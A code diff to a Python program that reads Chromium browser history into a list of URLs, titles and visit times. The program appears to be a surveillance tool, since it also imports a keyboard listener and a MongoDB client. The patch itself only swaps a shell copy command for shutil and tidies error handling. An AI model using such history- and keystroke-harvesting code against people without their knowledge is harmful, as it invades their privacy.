@@ -15,6 +15,7 @@ import sqlite3
 from io import BytesIO
 from datetime import datetime, timedelta
 import glob
+import shutil
 from pymongo import MongoClient
 from pynput import keyboard
 from dotenv import load_dotenv
@@ -473,7 +474,14 @@ def _get_chromium_history(history_path, browser_name, limit=50):
         return []
     temp_db = f"temp_{browser_name.lower()}_history.db"
     try:
-        os.system(f'copy "{history_path}" "{temp_db}"')
+        shutil.copy2(history_path, temp_db)
+    except Exception as e:
+        print(f"Error copying {browser_name} history: {e}")
+        return []
+
+    rows = []
+    conn = None
+    try:
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
         cursor.execute(
@@ -481,26 +489,27 @@ def _get_chromium_history(history_path, browser_name, limit=50):
             (limit,)
         )
         rows = cursor.fetchall()
-        conn.close()
-        os.remove(temp_db)
-        results = []
-        for url, title, last_visit_time in rows:
-            visited_at = _webkit_time_to_datetime(last_visit_time)
-            results.append({
-                "url": url,
-                "title": title,
-                "visited_at": visited_at.isoformat() if visited_at else None,
-                "browser": browser_name
-            })
-        return results
-    except Exception as e:
+    except sqlite3.Error as e:
         print(f"Error reading {browser_name} history: {e}")
+    finally:
         try:
+            if conn:
+                conn.close()
             if os.path.exists(temp_db):
                 os.remove(temp_db)
         except Exception:
             pass
-        return []
+
+    results = []
+    for url, title, last_visit_time in rows:
+        visited_at = _webkit_time_to_datetime(last_visit_time)
+        results.append({
+            "url": url,
+            "title": title,
+            "visited_at": visited_at.isoformat() if visited_at else None,
+            "browser": browser_name
+        })
+    return results
 
 def _get_firefox_history(limit=50):
     results = []
